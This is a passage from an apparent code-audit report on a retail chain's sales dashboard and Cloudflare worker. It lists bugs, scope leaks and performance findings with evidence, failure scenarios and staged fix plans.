3. Why worker first: the canonical key changes, and only the worker can keep reading legacy 8-digit rows.
4. Verify: unit tests merchCanonicalUpc('04252614') === '042100005264', merchIdForms includes '04252614', isPlausibleBarcode('04252615') === false. A test-price-scan D1 case where an item cached under one spelling is found by a scan of the other.

- **[merch-price-scan-15](#merch-price-scan-15) — Choosing a template in the sticker editor's dropdown makes it live chain-wide and discards unsaved edits** (medium, bug, `index.html:25627`)  
  *Plan:* FUTURE PLAN.
1. Worker (additive, deploy first): include `items: coll.items` (fields included; at most 10 small objects) in the sticker-template GET. Old clients ignore it.
2. Frontend: stPick switches locally when the GET carried `items` (`stTpl = clone(items.find(t => t.id === id))`) and sends no POST. If the field is absent (worker not yet deployed), fall back to today's path, so either deploy order stays correct. Before switching, if stTpl differs from its saved copy, `await uiConfirm('Discard the unsaved changes to …?')`. Activation then happens only through 'Use this one' (stActivate).
3. Deploy order: the worker first, because the frontend's new path depends on the new field and has a fallback for when it is missing.
4. Verify: a test-price-scan case that drives stPick with a scripted worker returning items and asserts zero sticker-template-set POSTs, and one that omits items and asserts the legacy activate path still works.

### eBay Cases

- **[ebay-cases-12](#ebay-cases-12) — Alert pushes ignore storefront (unit) scope, so a user limited to one account is pushed another account's cases and totals** (medium, security, `worker.js:9059`)  
  *Plan:* FUTURE PLAN (worker-only, no API or schema change):
1. Have ebayAlertRecipients return `u.role` and `g.units`, and derive each recipient's scope with the same rule as allowedUnits(user,'ecom'): superuser or admin → null (all), grant units NULL → all, otherwise the parsed list, and fail closed on unparseable JSON.
2. Group recipients by scope key. For each group, filter `failed`, `aa` and `nh` to accounts in scope, build that group's title and body from the filtered lists, and send only to that group's subscriptions (sendEbayAlert takes a recipient list rather than querying).
3. Stamp the ledger per case only when at least one in-scope recipient received it (combine with ebay-cases-13).
4. Deploy order: worker only. Nothing on the client changes, and the response shape of ingest is unchanged.
5. Verify: add a unit-scoped user to test-ebay-alerts.mjs (ecom units ['shoes']) plus a 'fashion' case, and assert there is no notification_log row for them and that a 'shoes' case still reaches them. Then do a staging ingest per tasks/ebay-case-handler.md before prod. Risk: more push batches (one per scope group). Keep the 3-trigger cap per group.

- **[ebay-cases-14](#ebay-cases-14) — Ingest issues one D1 query per case and per audit line; a backlog or full-file resend can exceed the ~1,000-subrequest cap and loop forever** (medium, performance, `worker.js:16384`)  
  *Plan:* FUTURE PLAN (worker-only, response contract unchanged):
1. Prepare the case upsert once and send the binds through `env.DB.batch` in chunks of about 50. Compute the line hashes up front (`await Promise.all(audit.map(l => sha256Hex(JSON.stringify(l))))`), then batch the INSERT OR IGNORE statements in chunks. Batch the ledger UPDATEs in runEbayAlerts as well.
2. Keep everything else as it is: the `now` stamp logic, the COUNT-delta event count, sinceActionId, and the stale sweep (still per account, still count-then-update).
3. Deploy: worker only; the client and Handler are unaffected. D1 batches are transactional per chunk, and both writes are idempotent (upsert / INSERT OR IGNORE), so a mid-way failure plus Handler's resend converges.
4. Verify: extend test-ebay-ingest.mjs with 600 cases and 2,000 audit lines and a prepare/run counter, assert under ~40 D1 calls and identical row contents versus the loop version, and run test-ebay-stale-close and test-ebay-alerts. Then do a staging POST from Raj before prod, per tasks/ebay-case-handler.md, and confirm the rollout landed per CLAUDE.md rule 5.
Risk: the batch-size limit and CPU time on very large payloads. Cap the chunk size and consider asking Raj to stop sending cases that have been closed for more than N days.

### Login, Settings, Accessibility, Landing, No-access

- **[auth-settings-9](#auth-settings-9) — Magic-link GET burns both the link and the OTP (same row), so a mail scanner that pre-fetches links kills both sign-in methods** (medium, bug, `worker.js:15891`)  
  *Plan:* FUTURE PLAN (worker-only; no frontend or schema change). 1) Split the row: auth-login inserts two rows, a link row (token=linkToken, otp_code NULL) and a code row (token=randomHex(32), otp_code=code), with the same email and expiry. Using either one marks all of that email's unused rows used, so both still die together after a real sign-in. 2) Make GET auth-verify side-effect-free: return a tiny HTML page with a 'Continue to RETJG Hub' button that POSTs the token (or auto-submits via JS after a user-visible delay). Only the POST consumes the token and sets the cookie. 3) Keep accepting a GET of old links for 15 minutes after deploy by serving them the same interstitial. Deploy order: worker only. The frontend never calls auth-verify, and old emails keep working through the interstitial, so nothing breaks backward compatibility. Risks: scanners that execute JS may still POST (mitigate with a user-gesture-only button); the interstitial must set no cookie on GET. Verify on staging with a throwaway account: GET the link with curl (no cookie set), then the OTP from the same email still works, then clicking Continue signs in. Confirm the rollout per CLAUDE.md rule 5.

### Admin Settings (Repair console, costs, overrides)

- **[admin-settings-1](#admin-settings-1) — items-snapshot and snapshot overwrite KV/D1 history with no magnitude guard and no backup** (high, bug, `worker.js:18987`)  
  *Plan:* FUTURE PLAN. 1) Worker: make items-snapshot call rebuildItemSnapshot(env, store, date, {catMap, overrides, itemCosts, d1Total, todayStr, force:true, backupPrefix}) for each store. Load d1Total from daily_sales and fail closed (skip with a reason) if the D1 read errors. Write a repair-backup-meta record (90-day TTL) before the first write, so every overwrite appears in the Backups list and can be restored. Keep the response shape {ok, date, results:{STORE:{ok, skipped?, reason?}}}; callers only read error/resp.ok. 2) Worker: in `snapshot` and snapshotDayByClientTime, for any date other than ET today, apply the same rule before either write. Refuse when the new item net or new total is below the stored KV/D1 figure x BACKFILL_MIN_D1_RATIO. Back up the prior KV snapshot (same prefix) and the prior daily_sales row: either KV `d1-backup:<id>:<store>:<date>` with a TTL, or a new daily_sales_audit table, whose migration must land before the worker. 3) Frontend, only after the worker is live: show per-date skip reasons, and replace the blind-range buttons with 'health check, then repair the listed dates'. DEPLOY ORDER: worker first. It only adds refusals and keeps the response contract, so today's frontend keeps working. The frontend changes that read new fields follow. RISKS: a genuine downward correction (e.g. a late refund) gets refused; the 1% ratio tolerates normal drift and the refusal is shown. Backups add KV puts against the daily quota. The nightly cron path for today must not be routed through the new refusal. VERIFY offline, stubbing the platform rather than the code: drive worker.fetch with globalThis.fetch returning a partial Clover day (153 of 241 orders) against node:sqlite D1 seeded with the full total. Assert skipped, KV and D1 byte-identical, no backup spent. Control case: the full day, assert written with a backup. Never verify by re-pulling a healthy production date. After deploying, poll until several requests in a row show the new behaviour (~180 s rollout).

- **[admin-settings-5](#admin-settings-5) — Manual Labor Hours locks the whole store-day row, so that day's sales and budget stop updating** (high, bug, `index.html:15863`)  
  *Plan:* FUTURE PLAN. 1) Migration (additive): `ALTER TABLE daily_sales ADD COLUMN labor_hours_manual INTEGER DEFAULT 0`. 2) Worker: an hours-only payload with a new `lockHours:true` sets labor_hours_manual=1 and leaves is_manual_override alone; importSheetToD1's labor_hours CASE honours labor_hours_manual. 3) Frontend: runManualLaborSingle and runManualLaborBulk send `{ markOverride:false, lockHours:true, entries }`. DEPLOY ORDER: migration, then worker (it ignores the flag when absent, so the old frontend is unaffected), then frontend (it needs a worker that accepts lockHours). INTERIM, frontend-only and safe: refuse dates on or after ET today in both functions, and add a uiConfirm plus copy stating that the entry freezes the whole store-day (sales, budget) against the nightly snapshot and the sheet. RISK: without step 2, markOverride:false alone would let the sheet overwrite the hours. VERIFY with a node:sqlite harness in the style of test-labor-plan.mjs: after an hours-only admin write, fetchAggregateAndSnapshot still writes the total and the sheet import leaves labor_hours alone.

- **[admin-settings-6](#admin-settings-6) — Manual sales overrides and the daily-CSV import overwrite and permanently lock D1 totals with no backup, summary or undo** (medium, bug, `index.html:15772`)  
  *Plan:* FUTURE PLAN. 1) Worker (additive): in manual-override, read the existing row first, save it (KV `override-backup:<ts>:<store>:<date>` with a 90-day TTL, or a daily_sales_audit table via a migration applied first), and return `before` in each result. Validate store against ALL_STORES and that the date is a real calendar date. 2) Worker: a new superuser action `manual-override-clear` {store, date} that sets is_manual_override=0, optionally restoring `before`. 3) Frontend: a preview step that fetches the current rows and shows a before/after table in a danger uiConfirm; skip import rows whose delta is under $1; add an Unlock control. DEPLOY: migration, then worker, then frontend (the frontend calls the new action). RISK: extra KV writes. VERIFY with node:sqlite: an override stores a backup and returns `before`; clearing flips the flag and the next fetchAggregateAndSnapshot writes the total.

- **[admin-settings-16](#admin-settings-16) — Choosing a template in the sticker editor makes it the label every store prints** (medium, bug, `index.html:25627`)  
  *Plan:* FUTURE PLAN. 1) Worker (additive): include `items: coll.items` (id, name, fields) in the GET sticker-template response. 2) Frontend: stPick reads the fields from GET and never POSTs; activation happens only through 'Use this one' (stActivate); uiConfirm when stTpl has unsaved edits. DEPLOY: worker first, because the new frontend reads `items` from GET. Until then, stPick should fall back to `uiConfirm('Switching makes "X" the label every store prints...', { danger: true })` before activating. INTERIM, frontend-only: add exactly that confirmation now. VERIFY with a playwright run and stubbed fetch that changing the select issues no POST.

### Worker core (Clover fetching, snapshots, rollups)

- **[worker-core-2](#worker-core-2) — resolveWeekDates and the nightly week rollup pick the wrong dates, and the wrong KV year, for the week that crosses a year boundary** (high, bug, `worker.js:2991`)  
  *Plan:* FUTURE PLAN.
1. Pick one fiscal-year rule that matches the retail calendar: the fiscal year of a Sun–Sat week is the calendar year of its Saturday (F26 wk1 ends 2026-01-03, F26 wk52 ends 2026-12-26, F27 wk1 ends 2027-01-02).
2. resolveWeekDates(env, week, fy): `SELECT DISTINCT date FROM daily_sales WHERE week = ? AND strftime('%Y', date(date,'weekday 6')) = ? ORDER BY date`. This always returns one contiguous Sun–Sat block.
3. Key `week-summary:` by that same fiscal year in every writer (rollupWeekSummariesIfReady derives it from `date(todayStr,'weekday 6')` rather than todayStr) and every reader (weekly-t13 uses `wkObj.end.slice(0,4)` instead of the start year). Only the straddling week 1 keys change; every other week's start year and end year already agree.
4. Audit callers that pass a request year (weekly-summary single-week mode, buildWeeklyByDayData uses `date.slice(0,4)`) against the new rule.

Deploy: worker-only; readers and writers ship together in one deploy, so ordering is not an issue. Afterwards run rebuild-week-summaries for the week-1 weeks and delete the orphaned `1-2025` / `1-2026` keys. This is a KV overwrite of stored history, so rule 7 requires explicit confirmation.

Risks: a caller that meant calendar year. Verify with a harness test across F26/F27 week 1 and week 52, and diff weekly-t13 output for a normal mid-year window before and after (it must be identical).

- **[worker-core-7](#worker-core-7) — Snapshot writers treat a failed refunds or credits fetch as 'no refunds' and write inflated totals; no guard catches over-statement** (high, bug, `worker.js:2521`)  
  *Plan:* FUTURE PLAN (spans six callers).
1. Give fetchRefundElements, fetchManualRefunds and fetchRefundsTotal a strict mode (see worker-core-6) that returns null on failure.
2. Every WRITING caller treats null exactly like orders===null: skip the write and report `skipped:"INCOMPLETE_FETCH"`. The callers are the nightly main pass (28296-28325), snapshotDayByClientTime (4814-4837), ?action=snapshot (18785-18822), rebuildItemSnapshot (2879-2883), resnapshot and backfill paths, and the live route's snapshot-on-fetch.
3. The live route still renders but returns `refundsUnavailable:true` (an additive field) and does not call saveSnapshot; the frontend can show a caveat later.

Deploy: worker-only; the API change is additive, so there is no ordering constraint.

Risk: more skipped days during Clover incidents. For D−1 and D−2 the sweep retries on the next nights; older days go to the Repair console.

Verify: harness probes with /refunds answering 429 → no D1 or KV writes; the full suite (`bash scripts/test.sh`) stays green.

- **[worker-core-9](#worker-core-9) — Nightly clientCreatedTime sweep re-pulls two healthy prior days with no magnitude guard, so a short Clover fetch overwrites D1 and KV** (high, bug, `worker.js:4837`)  
  *Plan:* FUTURE PLAN.
1. In snapshotDayByClientTime, measure the createdTime window independently from the wide fetch. Let `inWindow` be the orders with createdTime in [dayStart, dayEnd), `movedOut` those in the window whose client day ≠ D, and `movedIn` those outside it whose client day = D.
2. Read the existing daily_sales row (order_count, total). If `inWindow.length < existing.order_count * BACKFILL_MIN_D1_RATIO` for D < today, skip both writes and return `{ skippedShortFetch: true, inWindow, existing }`. Legitimate clientCreatedTime moves are still allowed, because the check is on the createdTime window, which should never shrink between nights.
3. Back up `items:` and `item-hours:` before overwriting a prior day (rule 2), and abort if the backup fails.
4. Surface the skip in resnapshot-clienttime's status and in the cron log.

Deploy: worker-only, no migration, no ordering constraint.

Risk: an outage day with many late syncs moves orders without changing the createdTime window, so it still passes.

Verify: probe-sweep.mjs step 3 is skipped; a late-sync fixture (orders moved from today into D−1) still lands.

- **[worker-core-10](#worker-core-10) — Fully refunded same-day orders are dropped by the `order.total <= 0` skip and then their refund is subtracted again** (high, bug, `worker.js:3794`)  
  *Plan:* FUTURE PLAN.
1. Confirm first, because it depends on Clover's behaviour. Run ?action=sales-diag (it counts zeroTotalOrderCount, 19172) for a date with a known same-day full refund, and check that the zero-total order carries SUCCESS payments equal to the refund.
2. If confirmed, in both aggregators compute pmtSumCents first and skip only when `order.total == null || (order.total < 0) || (order.total === 0 && pmtSumCents <= 0)`. Keep skipping negative totals, which are the manual-refund orders.
3. Add fixtures for full, partial and cross-day refunds asserting net = kept sales.

Deploy: worker-only; it changes numbers from the next snapshot onward. Do NOT bulk re-pull history to 'fix' past days (rule 1): the sweep corrects D−1 and D−2 naturally, and anything older goes through the health check only.

Verify with test-live-sales-reconcile.mjs and test-channel-invariants.mjs.

- **[worker-core-11](#worker-core-11) — Live route leaves out manual refunds (credits), so the live cards and intraday D1 are high by that amount and the total drops overnight** (medium, bug, `worker.js:28157`)  
  *Plan:* FUTURE PLAN (small, but it changes what a live write persists).
1. Add `fetchManualRefunds(targetStore, env, startOfToday)` to the Promise.all at 28114.
2. Pass it as the 9th argument: `aggregateItemSales(elements, itemCatMap, targetStore, et.dateStr, overrides, itemCosts, refundElements, [], manualRefundElements)`.
3. Also add `Σ(amount − taxAmount)` over the credits to `refundCents` for the fallback path.

This costs one extra Clover call per live request. Deploy: worker-only; the response shape is unchanged.

Verify: probe-live.mjs total 50, and test-live-sales-reconcile.mjs with a non-empty /credits stub.

### Worker crons, briefings, push, sale scheduler

- **[worker-cron-notify-15](#worker-cron-notify-15) — Nightly job does all its work in one serial invocation: today is fetched twice, closed Holland is fully processed, and the subrequest budget comment is out of date** (low, performance, `worker.js:28278`)  
  *Plan:* Future plan, worker-only. (1) Add crons '10 4 * * *' (bank + rollups) and '25 4 * * *' (sheet import), each wrapped in superviseCronJob and gated on the heartbeat from finding 7 (`cron:nightly:ok === todayStr`). That preserves the load-bearing order 'sheet import after the snapshot' (28419-28423) even if the first run is late. (2) Skip stores where `STORE_CLOSED_FROM[s] <= d` in the pass, sweep and bank. That only removes pulls; it never re-pulls anything. (3) Consider dropping the createdTime pass for today once the k=0 sweep has proven equivalent over a week of side-by-side D1 comparisons. It writes daily_sales, so do it only after that cross-check (CLAUDE.md rule 4). Deploy: worker only, then read back the crons printed by `wrangler deploy` (lessons 2026-07-15). Verify: next morning's daily_sales rows for all open stores carry snapshot_time between 03:55 and 04:10 UTC, and txn-archive and sheet-import log lines appear under their new crons.

## Page by page

<a id="dashboard"></a>
### Dashboard

The Dashboard's date math and escaping are careful: ymd helpers anchored to UTC, ET "today" via Intl, escapeHtml on every interpolated name, uiAlert instead of native dialogs, an in-flight key guard on the channel loaders, and closed-store budget handling that has tests pinning it. The biggest risks are data that looks live but isn't. (1) The Matrix tiles on the hero and every card freeze at the first load's values, so a refresh updates Net but not Cart, Items, Orders or ASP. (2) Nothing refreshes when the app resumes or the ET day rolls over. (3) The Hourly Snapshot (the target of the push notifications) renders whatever is in memory under the current time. (4) Live-fetch failures are swallowed, so a dark store reads as "No transactions yet" and drags chain pace down with no warning. On the worker side, the live handler trusts the client's `since` on a path that writes D1 and KV, and it overwrites same-day manual overrides. `?action=snapshot` has a one-click 91-day button that re-pulls dates with no backup or partial-fetch guard. There is also a hard year-2027 time bomb in the history fetch. Performance: a cold "Today" load makes 10 duplicate `?action=items` Clover pulls, plus one full Clover pull per card for the sparkline, and every refresh re-downloads about two years of history. I verified the key claims in a stubbed Chromium run: every non-local request was aborted, and scratchpad/dashboard/probe.mjs holds the stubs. I checked the worker offline with its own harness (worker-harness.mjs, since-probe.mjs, brief-probe.mjs).

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [dashboard-1](#dashboard-1) | high | minor | bug | Matrix tiles (hero + every store card) freeze at first-load values; refresh updates Net but never Cart/Items/Orders/ASP | `index.html:9518` | unverified |
| [dashboard-2](#dashboard-2) | high | minor | bug | Live Clover failures are swallowed, so the 'not reporting — pace unavailable' guard, the card error state and the offline alert are dead code | `index.html:8155` | unverified |
| [dashboard-4](#dashboard-4) | high | minor | bug | No refresh on app resume or at ET midnight: the installed PWA keeps showing 'Today' for a day that has ended | `index.html:8355` | unverified |
| [dashboard-5](#dashboard-5) | high | minor | bug | Hourly Snapshot (push-notification target) shows whatever live data is in memory, stamped with the current time and 'Live' | `index.html:11621` | unverified |
| [dashboard-7](#dashboard-7) | high | minor | bug | Live fetch sends browser-local midnight as `since`; the worker trusts it and writes the result as today's ET snapshot (D1 daily_sales + KV) | `index.html:8136` | unverified |
| [dashboard-8](#dashboard-8) | high | minor | bug | Snapshot-on-fetch overwrites a same-day manual override, and the kept flag then freezes the clobbered value permanently | `worker.js:4622` | unverified |
| [dashboard-9](#dashboard-9) | high | major | bug | Year-rollover time bomb: history is fetched with a hard-coded to=2026-12-31, and weeks are keyed by a label that repeats each year | `index.html:8066` | unverified |
| [dashboard-10](#dashboard-10) | high | major | bug | ?action=snapshot re-pulls any date with no backup or partial-fetch guard, and a one-click admin button runs it over 91 days for all stores | `worker.js:18737` | unverified |
| [dashboard-3](#dashboard-3) | medium | minor | bug | Store-card Retry button is broken: unescaped JSON quotes terminate the onclick attribute | `index.html:10163` | unverified |
| [dashboard-6](#dashboard-6) | medium | minor | bug | Hourly Snapshot chain budget omits BUDGET_ONLY_STORES (Holland), disagreeing with the hero and the push it was opened from | `index.html:11652` | unverified |
| [dashboard-11](#dashboard-11) | medium | minor | bug | LY pills/tiles and hourly sparklines have no staleness guard, so a slow response for an earlier range paints into the current cards | `index.html:9809` | unverified |
| [dashboard-12](#dashboard-12) | medium | minor | ui-ux | 'vs LY' on any range that includes today compares day-to-date against last year's full day(s) | `index.html:10201` | unverified |
| [dashboard-13](#dashboard-13) | medium | minor | bug | A failed channel-split fetch renders as '0 orders' and is cached for the rest of the range | `index.html:9580` | unverified |
| [dashboard-14](#dashboard-14) | medium | minor | bug | On Sunday before local noon the Weekly budget card (and Store Detail) drop today's live sales | `index.html:8335` | unverified |
| [dashboard-17](#dashboard-17) | medium | minor | performance | Cold 'Today' load makes 10 extra full Clover pulls (?action=items) that duplicate the live fetch | `index.html:9589` | unverified |
| [dashboard-18](#dashboard-18) | medium | minor | performance | Refresh re-downloads about two years of D1 history for 6 stores just to update today's numbers | `index.html:8239` | unverified |
| [dashboard-21](#dashboard-21) | medium | minor | security | ?action=daily-brief returns the chain-wide AI brief to store-scoped managers | `worker.js:21533` | unverified |
| [dashboard-22](#dashboard-22) | medium | minor | ui-ux | At 393px the hero total and card Net are ellipsis-truncated on multi-week ranges, and channel tile values overflow their tiles | `index.html:1410` | unverified |
| [dashboard-23](#dashboard-23) | medium | minor | accessibility | Contrast: LY chips (light and dark) and the OFFLINE pill (light) fail 4.5:1 | `index.html:9790` | unverified |
| [dashboard-19](#dashboard-19) | medium | major | performance | Hourly sparkline costs one full Clover order pull per store per render, including immutable past dates | `worker.js:27403` | unverified |
| [dashboard-15](#dashboard-15) | low | minor | bug | Weekly budget card omits today's auction (hero and Monthly include it) | `index.html:9117` | unverified |
| [dashboard-16](#dashboard-16) | low | minor | ui-ux | Budget card: 'days left' always counts the current month; variance loses its alignment; a zero-budget delta is painted red | `index.html:9488` | unverified |
| [dashboard-20](#dashboard-20) | low | minor | performance | saveSnapshot attempts ALTER TABLE on every live fetch | `worker.js:4640` | unverified |
| [dashboard-24](#dashboard-24) | low | minor | accessibility | Keyboard: role=button divs don't respond to Enter/Space, and the custom calendar, budget toggle and notification rows are bare divs | `index.html:1451` | unverified |
| [dashboard-25](#dashboard-25) | low | minor | ui-ux | Tap targets below DESIGN §9's 40px minimum on the phone | `index.html:10195` | unverified |
| [dashboard-26](#dashboard-26) | low | minor | ui-ux | On multi-day ranges the sparkline shows only the last day, with no label | `index.html:10128` | unverified |
| [dashboard-27](#dashboard-27) | low | minor | ui-ux | Refresh swaps every real card for off-token gray skeletons, so the page jumps | `index.html:8207` | unverified |
| [dashboard-28](#dashboard-28) | low | minor | code-quality | Dead code in scope, including work loadAll repeats on every load | `index.html:8023` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="dashboard-1"></a>
#### dashboard-1 — Matrix tiles (hero + every store card) freeze at first-load values; refresh updates Net but never Cart/Items/Orders/ASP

*high · minor · bug · confidence high · `index.html:9518` · unverified*

**Evidence.** chRangeKey() is `${dateRange.from}..${dateRange.to}${selIncludesToday() ? '+live' : ''}` (index.html:9517-9519) — constant all day. ensureDashChannel: `if (dashChannelData && dashChannelData.key === key) { applyDashChannel(); return; }` (9609); ensureCardChannel the same (9706). dashChannelData / dashCardChData are only assigned at 9683/9752; loadAll(force) (8238-8254) clears _apiCache/itemSalesCache but never these. renderCards writes fresh v1Cart/v1Orders into the tiles, then ensureCardChannel(cardCode) (10219) immediately overwrites them from the cached split. Browser probe (stubbed API, Wed 14:00 ET): first load 5 orders/$1,000 per store; stub moved to 50 orders/$3,000; loadAll(true) → BL1 card Net "$3,000.00" but tiles "cart=$200.00 items=3.0 orders=5 asp=$66.67"; hero #mx-orders stayed 25 while #c-today-total went $5,000 → $15,000.

**Failure scenario.** A manager opens the app at 9am and pulls to refresh at 3pm. Net and pace update, but Orders, Avg Cart, Items and ASP on the hero and on every card still show the 9am values for the rest of the day (until midnight or a range change). The tiles stop multiplying out to the Net beside them, which is the invariant MEMORY.md says they were redesigned to hold.

**Proposed fix.** In loadAll, inside `if (force) {…}`, add: `dashChannelData = null; dashChannelLoadKey = null; dashChannelLoading = false; dashCardChData = {}; dashCardChLoadKey = {}; dashCardChLoading = {};`. In the cloverPromise `.then` before renderDashboard(), when selIncludesToday(), do the same reset so the '+live' split is rebuilt from liveCloverData[s].channels. fetchStoreChannels already prefers that, so this costs no request. Verify with the stubbed probe: after refresh the BL1 tiles read cart $60.00 and orders 50.

<a id="dashboard-2"></a>
#### dashboard-2 — Live Clover failures are swallowed, so the 'not reporting — pace unavailable' guard, the card error state and the offline alert are dead code

*high · minor · bug · confidence high · `index.html:8155` · unverified*

**Evidence.** fetchLiveCloverSales ends `} catch (error) { console.warn(`Clover API error for ${storeKey}:`, error.message); return null; }` (8155-8158), so it never throws. Its callers only set liveCloverErrors in their own catch: `liveCloverData[s] = await fetchLiveCloverSales(storeKey); delete liveCloverErrors[s]; } catch (err) { … liveCloverErrors[s] = …` (8299-8305, 8392-8398), which can never run. The dead consumers are liveDark (9281-9283), v1Error (10078) and the offline notification (8836). Probe with BL2's live endpoint returning 500: `liveCloverErrors: {}`. The BL2 card read "OFFLINE · No transactions yet · −$1,000.00 vs $1,000.00 · Pace 0%", and the hero read "4 of 5 reporting | pace 200% | +$6,000.00 vs $6,000.00": the budget includes the dark store.

**Failure scenario.** Clover returns 429/500 for one store at 2pm. That card looks like a store that has not rung a sale (dimmed, OFFLINE, −100% of budget), and chain pace drops by that store's share of budget with no warning. This is exactly the misreading the comment at 9275-9280 says the code prevents.

**Proposed fix.** In fetchLiveCloverSales, rethrow after the console.warn (keep that line: scripts/test-live-sales-reconcile.mjs slices the function up to it), and treat a 200 `{error}` body as a throw. Keep `!('aggregate' in data) → return null` for mid-rollout workers. Ship together with dashboard-3, because the Retry button becomes reachable on the Today view. Verify with the probe: liveCloverErrors.BL2 is set, the hero shows "South Bend not reporting — pace unavailable" and the card shows Couldn't load · Retry.

<a id="dashboard-4"></a>
#### dashboard-4 — No refresh on app resume or at ET midnight: the installed PWA keeps showing 'Today' for a day that has ended

*high · minor · bug · confidence high · `index.html:8355` · unverified*

**Evidence.** dateRange is only re-resolved inside loadAll (8355-8358) and setDateRange. loadAll is called only at boot (34881), from pull-to-refresh (21466), from the ↻ button (34830) and from the hourly snapshot (11752/11782). A grep for visibilitychange, or for a setInterval that reloads data, finds nothing. After midnight the stale range fails selIncludesToday(); the previous day's row was nulled as 'today' by loadStoreFromD1 (8093-8097) and has no cloverHistory entry (8107). Probe: loaded at 23:50 ET, clock advanced to 00:15 ET, then visibilitychange/focus/pageshow dispatched: 0 requests. The next render shows "Today · All Stores", total "—", pill OFFLINE, and BL1 "$0.00 −$1,000.00 vs $1,000.00 Pace 0%".

**Failure scenario.** A manager opens the home-screen app at 8am after iOS restored it from memory. It shows yesterday afternoon's numbers under 'Today', or after any re-render shows yesterday as $0 / 0% pace, until they think to pull to refresh.

**Proposed fix.** Frontend only, about 20 lines. At the end of loadAll, set `_dashLoadedDay = etTodayStr(); _dashLoadedAt = Date.now();`. Add `document.addEventListener('visibilitychange', …)`: when the page is visible, canSeeFinancials(currentUser), !liveDataLoading, and either etTodayStr() !== _dashLoadedDay or the data is more than 5 minutes old, call loadAll(true). While the page is visible, arm a setTimeout for the next ET midnight that does the same. Verify with page.clock in the probe.

<a id="dashboard-5"></a>
#### dashboard-5 — Hourly Snapshot (push-notification target) shows whatever live data is in memory, stamped with the current time and 'Live'

*high · minor · bug · confidence high · `index.html:11621` · unverified*

**Evidence.** `function liveDataReady() { return STORES.some(s => liveCloverData[s]?.total != null); }` has no age or day check. openHourlySnapshot renders at once when it is true (11739-11742), and `hsTimer = setInterval(() => renderHourlySnapshot(false), 60000)` (11729) only re-renders the same in-memory numbers with a new time. A warm notification tap arrives through sw-navigate → handleDeepLink (34788). Probe: loaded at 09:00 ET ($1,000/store), live changed to $5,000/store, clock +6h, handleDeepLink('/?view=hourly'). The overlay read "3:00 PM … Day-to-date $5,000.00 / $5,000.00 … Coliseum $1,000.00" and the tap made 0 requests.

**Failure scenario.** The 3pm 'Sales Update' push says Coliseum $5,000. Tapping it opens a card stamped 3:00 PM 'Day-to-date' showing $1,000 from the 9am load, or, the next morning, yesterday's totals against today's budget.

**Proposed fix.** Record `_liveLoadedAt` and `_liveLoadedDay` in the cloverPromise `.then`. Make liveDataReady() also require an age under 2 minutes and the same ET day; otherwise openHourlySnapshot's existing branch calls loadAll(true) and polls. Point the 60 s steady timer at refreshHourlySnapshot every 5 minutes, or drop the 'Live' wording from the refresh chip.

<a id="dashboard-7"></a>
#### dashboard-7 — Live fetch sends browser-local midnight as `since`; the worker trusts it and writes the result as today's ET snapshot (D1 daily_sales + KV)

*high · minor · bug · confidence high · `index.html:8136` · unverified*

**Evidence.** Client: `const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime(); … ?store=${storeKey}&since=${startOfToday}` (8136-8137). Worker: `const since = url.searchParams.get("since"); const et = getETToday(); const startOfToday = since ? Number(since) : et.startOfDay;` (worker.js:28098-28100), then `ctx.waitUntil(saveSnapshot(env, targetStore, et.dateStr, aggregate))` (28202), with no bound on since. Offline harness (real worker.fetch, Clover stubbed with $4,000 of orders at 4-5pm ET yesterday): since=ET midnight → aggregate null, nothing written. since=CT midnight of the prior day (a Central-time phone at 23:30 CT) → response total 4000 and D1 row {"date":"2026-09-22","total":4000,"order_count":2}. since=0 from the BL1-only manager wrote the same row.

**Failure scenario.** An admin whose phone is on Central time (NW Indiana is CT) or who is travelling opens the dashboard between 00:00 and 01:00 ET. The page shows yesterday's whole day as 'Today', and daily_sales plus sales:<store>:<date> for the new ET day are overwritten with yesterday's total. The nightly zero-order guard then keeps that value (it preserves existing.total when Clover returns 0 orders), and dispatchIntervalSummary reads the row for pushes. Any store-scoped user can also do this on purpose with since=0, which also costs a 90-day Clover pull per call.

**Proposed fix.** Frontend, one line: drop `&since=`, since the worker already defaults to ET midnight. Worker hardening (backward compatible, adds safety): use `const startOfToday = et.startOfDay;` and ignore the parameter, or at least skip saveSnapshot unless startOfToday === et.startOfDay. The two changes are independent, so either can deploy first. Check that scripts/test-request-scoping.mjs (since=0) still asserts only status codes. Verify with the harness: a CT since writes no D1 row.

<a id="dashboard-8"></a>
#### dashboard-8 — Snapshot-on-fetch overwrites a same-day manual override, and the kept flag then freezes the clobbered value permanently

*high · minor · bug · confidence high · `worker.js:4622` · unverified*

**Evidence.** saveSnapshot's upsert is `ON CONFLICT(store, date) DO UPDATE SET total=excluded.total, retail=excluded.retail, bin=excluded.bin, …` with no is_manual_override check (worker.js:4641-4655). The guarded caller fetchAggregateAndSnapshot refuses override rows (4747-4752), but the live handler calls saveSnapshot directly (28202). manual-override accepts any YYYY-MM-DD, including today, and stamps is_manual_override=1 (21229, 21267-21273). Harness: an override of total 9999 for today followed by one dashboard live load left {"total":123.45,"retail":123.45,"bin":0,"is_manual_override":1}.

**Failure scenario.** A register is offline all morning, so a superuser keys today's true total through manual-override. The next dashboard load by anyone rewrites total/retail/bin from Clover's partial day. Because the flag stays 1, the nightly re-snapshot skips the row forever, and the hand-entered figure is lost with no backup.

**Proposed fix.** Worker only, backward compatible, adds safety: add `WHERE daily_sales.is_manual_override IS NOT 1` to saveSnapshot's DO UPDATE (SQLite upsert-where), or check the flag before writing as fetchAggregateAndSnapshot does. Its only two callers are the guarded path (4780) and the live path. Verify with the harness (9999 survives a live load) and the existing suite.

<a id="dashboard-9"></a>
#### dashboard-9 — Year-rollover time bomb: history is fetched with a hard-coded to=2026-12-31, and weeks are keyed by a label that repeats each year

*high · major · bug · confidence medium · `index.html:8066` · unverified*

**Evidence.** `${WORKER_BASE}?history_d1=true&store=${storeKey}&from=2025-01-01&to=2026-12-31` (8066). The worker returns exactly `date >= ? AND date <= ?` (worker.js:18608-18610). The page keys weeks by label alone: `.filter(r => r.week === selectedWeek)` (9113, 10311); getLastWeekRows by index into allWeeks (7880-7883); `allWeeks = [...weekSet].sort(parseFloat)` (8342). The worker documents that labels repeat per year: resolveWeekDates filters `date LIKE 'YYYY-%'` "so cross-year duplicate week numbers don't collide" (worker.js:2986-2993). Confidence is high for the hard-coded bound and medium for the collision, because it depends on the 2027 sheet's numbering.

